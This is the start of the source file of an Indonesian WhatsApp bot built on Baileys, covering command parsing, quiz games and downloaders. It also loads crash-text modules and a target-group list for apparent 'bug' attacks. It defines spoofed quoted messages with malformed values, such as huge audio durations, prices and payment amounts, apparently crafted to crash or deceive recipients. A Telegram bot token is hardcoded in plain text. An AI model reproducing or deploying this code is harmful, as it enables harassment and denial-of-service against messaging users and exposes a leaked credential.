/*
> Kalo Mau Recode Kasih Credit gw ›
        TheZetsubXygen / Ryo

📝| Created By thezetsuboxygen / Ryo
🖥️| Base Ori By thezetsuboxygen / Ryo


*/

require('./config')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
const { ryozingodConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')

// Disini Ada Beberapa Modul Yg Udh Gw Gk Pake, Kalian Hapus Manual Aja
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const truecallerjs = require("truecallerjs")
const { SearchData, Format } = truecallerjs
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { remini } = require('./lib/remini')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString();

const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
const fs = require('fs')

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

// Afk Function
let afk = require("./lib/afk");

// read database
let tebaklagu = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let akinator = []
let _afk = JSON.parse(fs.readFileSync('./dtbs/afk-user.json'))

//  Base
module.exports = ryozingod = async (ryozingod, m, chatUpdate, store) => {
try {
var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? m.message.InteractiveResponseMessage.NativeFlowResponseMessage :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);

const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
var isAuthor = global.Contributor.replace(/[^0-9]/g, '').includes(m.sender.split("@")[0])
const botNumber = await ryozingod.decodeJid(ryozingod.user.id)
const globalelit = `${global.Contributor}@s.whatsapp.net`
const isOwner = globalelit.includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
const iniseller = JSON.parse(fs.readFileSync('./dtbs/seller.json'))
const contacts = JSON.parse(fs.readFileSync("./dtbs/contacts.json"))
const isContacts = contacts.includes(m.sender)
const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDeveloper = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
const isAfkOn = afk.checkAfkUser(m.sender, _afk)

// Group
const groupMetadata = m.isGroup ? await ryozingod.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

//Pirtek
const { bersihin } = require('./latx/bersihin.js')
const { mdelay } = require('./latx/mdelay.js')
const { cartbutton } = require('./latx/cartbutton.js')
const { virtex2 } = require('./latx/virtex2.js')
const { ios1 } = require('./latx/ios1.js')
const { ios2 } = require('./latx/ios2.js')
const sedoso = fs.readFileSync(`./latx/10k.png`)
const dlapan = fs.readFileSync(`./latx/8,5k.png`)

//Penis
const fileContent = fs.readFileSync('./spider.js', 'utf8');
const jidData = JSON.parse(fs.readFileSync('./latx/bugjid.json', 'utf8'));
const gpjid = jidData.map(({ groupJid, groupSubject }) => ({
  jid: groupJid,
  name: groupSubject
}));

//Media 
const yaechan = fs.readFileSync(`./image/yaechan.jpg`)
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const crimson = fs.readFileSync(`./image/crimson.jpg`)
const emotion = fs.readFileSync(`./image/emotion.jpg`)
const menunya = fs.readFileSync(`./image/menunya.jpg`)
const thesky = fs.readFileSync(`./image/sky.mp4`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const night = fs.readFileSync(`./music/night.mp3`)

// Scrape Rek
const { dafontSearch, dafontDown } = require('./lib/dafont.js')
//const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./lib/yt.js')
const scp1 = require('./lib/scraper.js') 
//const scp3 = require('./lib/scraperrr.js')
const ffstalk = require('./lib/ffstalk.js')
const githubstalk = require('./lib/githubstalk.js')
const npmstalk = require('./lib/npmstalk.js')
const mlstalk = require('./lib/mlstalk.js')
const textpro = require('./lib/textpro.js')
const photooxy = require('./lib/photooxy.js')

// Presence 
let rn = ['composing','recording','paused']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
        ryozingod.sendPresenceUpdate(jd, m.chat)
}
        
//Donglod
const downloadMp3 = async (Link) => {
    try {
        await ytdl.getInfo(Link)
        let mp3File = getRandom('.mp3')
        ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
            await ryozingod.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
            fs.unlinkSync(`./${mp3File}`)
        })
    } catch (err) {
        xgreply(`${err}`)
    }
}

const downloadMp4 = async (Link) => {
    try {
        await ytdl.getInfo(Link)
        let mp4File = getRandom('.mp4')
        let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
            await ryozingod.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
            fs.unlinkSync(`./${mp4File}`)
        })
    } catch (err) {
        xgreply(`${err}`)
    }
}

//Push Kintil
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

//Ini Waktu | Waktu adalah emas,maka dari itu sentuh lah rumput.dan jangan nolep dikamar terus,usahakan tu kontol jangan dikocok terus.Lutut ama sikut lu kopong nanti
const moment = require("moment-timezone")
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
if(time2 < "20:00:00"){
var greetingTime = "Good Night 🌃"
}
if(time2 < "18:00:00"){
var greetingTime = "Happy Maghrib 🌆"
 }
if(time2 < "15:00:00"){
var greetingTime = "Good Afternoon 🌇"
 }
if(time2 < "12:00:00"){
var greetingTime = "Good Afternoon 🏜️"
}
if(time2 < "06:00:00"){
var greetingTime = "Good Morning 🏙️"
 }
if(time2 < "01:00:00"){
var greetingTime = "Good Morning 🌆"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam2 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})

//Status
if (!ryozingod.public) {
if (!m.key.fromMe) return
}

//Quoted 

const ryoreqphone = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
       "requestPhoneNumberMessage": {
           "contextinfo": 1
       }
    }
}

const ryovoice = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: ""
        } : {})
    },
    message: {
        "audioMessage": {
            "mimetype": "audio/ogg; codecs=opus",
            "seconds": 9999999999,
            "ptt": "true"
        }
    }
}

const fpoll = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: ""
        } : {})
    },
    message: {
        "pollCreationMessage": {
            "name": "p"
        }
    }
}

const ryobug = {
	key: {
		remoteJid: 'status@broadcast',
		fromMe: false, 
		participant: '0@s.whatsapp.net'
	},
    message: {
        listResponseMessage: {
            title: `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️🕷️ `
        }
    }
}

const ryobut = {
    key: {
        remoteJid: 'status@broadcast',
        fromMe: false, 
        participant: '0@s.whatsapp.net'
    },
    message: {
        buttonsResponseMessage: {
            selectedButtonId: '🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️',
            type: 1,
            response: {
                selectedDisplayText: 'penis'
            }
        }
    }
}

const ryocakep = {
    key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: `120363224727390375@newsletter`,
        newsletterName: `🔥`,
        jpegThumbnail: fakejpg,
        caption: ` 🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️ ? \n ⿻ ${m.body || m.mtype} `,
        inviteExpiration: Date.now() + 1814400000
      }
    }
};

const qpay = {
	key: {
		remoteJid: 'status@broadcast',
		fromMe: false,
		id: '0@s.whatsapp.net',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: 'USD',
			amount1000: 999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: 'INR'
			}
		}
	}
}

const qdoc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        documentMessage: {
            title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            jpegThumbnail: fakedoc,
        }
    }
}
const qvn = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "audioMessage": {
            "mimetype": "audio/ogg; codecs=opus",
            "seconds": 359996400,
            "ptt": "true"
        }
    }
}

const qtext = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "extendedTextMessage": {
            "text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            "title": `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️`,
            'jpegThumbnail': fakejpg,
        }
    }
}

const qtoko = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "productMessage": {
            "product": {
                "productImage": {
                    "mimetype": "image/jpeg",
                    "jpegThumbnail": fakejpg,
                },
                "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
                "description": `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️`,
                "currencyCode": "IDR",
                "priceAmount1000": "1000000000000000000",
                "retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
                "productImageCount": 1
            },
            "businessOwnerJid": `0@s.whatsapp.net`
        }
    }
}

const qgif = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "videoMessage": {
            "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            "h": `Hmm`,
            'seconds': '359996400',
            'gifPlayback': 'true',
            'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            'jpegThumbnail': fakejpg,
        }
    }
}

const qinvite = {
    key: {
        participant: "0@s.whatsapp.net",
        "remoteJid": "0@s.whatsapp.net"
    },
    "message": {
        "groupInviteMessage": {
            "groupJid": "6288213840883-1616169743@g.us",
            "inviteCode": "m",
            "groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            "caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            'jpegThumbnail': fakejpg,
        }
    }
}

const qvideo = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "videoMessage": {
            "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            "h": `Hmm`,
            'seconds': '359996400',
            'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            'jpegThumbnail': fakejpg,
            'viewOnce': true
        }
    }
}

const qloc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        locationMessage: {
            name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            jpegThumbnail: fakejpg,
        }
    }
}

const qloc2 = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "liveLocationMessage": {
            "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            "h": `Hmm`,
            'jpegThumbnail': fakejpg,
        }
    }
}

const qkontak = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        'contactMessage': {
            'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
            'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
            'jpegThumbnail': fakejpg,
            thumbnail: fakejpg,
            sendEphemeral: true
        }
    }
}

//CreateUnban
const { createsup1, createsup2, createsup3, createsup4, createsup5 } = require('./support/createsupport.js')
        
//Random
const inisupp = [createsup1, createsup2, createsup3, createsup4, createsup5,]
const randomsupp = inisupp[Math.floor(Math.random() * inisupp.length)];

const listcolor = ['aqua', 'red', 'blue', 'purple', 'magenta'];
const randomc = listcolor[Math.floor(Math.random() * listcolor.length)];

const moji = ['📚', '💭', '🌏', '〽️', '🌷', '🍁', '⛅',]
const randomemoji = moji[Math.floor(Math.random() * moji.length)]

const replyacak = [nulll, nulll2, crimson, emotion]
const imagereply = replyacak[Math.floor(Math.random() * replyacak.length)]

//Reply
const evalreply = async (teks) => {
  await sleep(500);
  return ryozingod.sendMessage(m.chat, {
    contextInfo: {
      mentionedJid: teks
        ? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net")
        : [],
      externalAdReply: {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️\n👤 名前 : ${m.pushName}`,
        body: ``,
        previewType: "PHOTO",
        thumbnail: yaechan,
        sourceUrl: `${global.yt}`,
        mediaUrl: `${global.yt}`
      }
    },
    text: teks
  }, {
    quoted: m
  });
  await sleep(500);
}

const xgreply = async (teks) => {
  await sleep(500);
  return ryozingod.sendMessage(m.chat, {
    contextInfo: {
      mentionedJid: teks
        ? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net")
        : [],
      externalAdReply: {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️\n👤 名前 : ${m.pushName}`,
        body: ``,
        previewType: "PHOTO",
        thumbnail: imagereply,
        sourceUrl: `${global.yt}`,
        mediaUrl: `${global.yt}`
      }
    },
    text: teks
  }, {
    quoted: m
  });
  await sleep(500)
}

//Reaction
const inireact = async () => {
  const emojis = ["🌑", "🌘", "🌗", "🌕", "🌔", "🌓", "🌒", "🌑"];
  
  for (const emoji of emojis) {
    await sleep(80);
    ryozingod.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  
  await sleep(50);
  ryozingod.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}

async function loading () {
    var bdick = [
        `▒▒▒▒▒▒▒▒▒▒ 0%`,
        `█▒▒▒▒▒▒▒▒▒ 10%`,
        `██▒▒▒▒▒▒▒▒ 20%`,
        `███▒▒▒▒▒▒▒ 30%`,
        `████▒▒▒▒▒▒ 40%`,
        `█████▒▒▒▒▒ 50%`,
        `██████▒▒▒▒ 60%`,
        `███████▒▒▒ 70%`,
        `████████▒▒ 80%`,
        `█████████▒ 90%`,
        `██████████ 100%`,
        `*Loading completed...*`
    ]
    let { key } = await ryozingod.sendMessage(m.chat, {text: `*Loading...*`})
    
    for (let i = 10; i < bdick.length; i++) {
        await ryozingod.sendMessage(m.chat, {text: bdick[i], edit: key });
    }
}

async function bugload () {
    var bdick = [
        `▒▒▒▒▒▒▒▒▒▒ 0%`,
        `█▒▒▒▒▒▒▒▒▒ 10%`,
        `██▒▒▒▒▒▒▒▒ 20%`,
        `███▒▒▒▒▒▒▒ 30%`,
        `████▒▒▒▒▒▒ 40%`,
        `█████▒▒▒▒▒ 50%`,
        `██████▒▒▒▒ 60%`,
        `███████▒▒▒ 70%`,
        `████████▒▒ 80%`,
        `█████████▒ 90%`,
        `██████████ 100%`,
        `*Loading completed...*`
    ]
    let { key } = await ryozingod.sendMessage(m.chat, {text: `*Loading...*`}, { quoted: ryobug })
    
    for (let i = 10; i < bdick.length; i++) {
        await ryozingod.sendMessage(m.chat, {text: bdick[i], edit: key }, { quoted: ryobug });
    }
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakgambar[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakgambar[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakgambar[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = kuismath[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete kuismath[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await xgreply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
        delete kuismath[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakasahotak[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakasahotak[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakasahotak[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebaksiapakahaku[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
        delete tebaksiapakahaku[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebaksusunkata[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebaksusunkata[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
        delete tebaksusunkata[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakbendera[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakbendera[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakbendera[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakbendera2[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakbendera2[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakbendera2[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakkabupaten[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakkabupaten[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakkabupaten[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakkimia[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakkimia[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakkimia[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebaktekateki[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebaktekateki[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
        delete tebaktekateki[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebaklagu[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebaklagu[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
        delete tebaklagu[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakkata[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebakkata[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakkata[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebakkalimat[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
